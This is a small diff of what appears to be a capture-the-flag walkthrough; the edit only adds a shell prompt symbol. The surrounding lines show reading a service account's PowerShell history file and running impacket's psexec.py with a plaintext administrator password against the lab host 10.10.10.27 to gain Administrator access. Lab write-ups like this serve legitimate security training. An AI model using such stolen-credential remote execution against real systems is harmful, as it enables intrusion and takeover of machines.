@@ -65,7 +65,7 @@ type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\Co
 Reveals that backup share was mounted with admin privileges.
 
 ```bash
-python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator:MEGACORP_4dm1n\!\!@10.10.10.27
+$ python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator:MEGACORP_4dm1n\!\!@10.10.10.27
 ```
 And Bam!! we have Administrator Privileges.
 
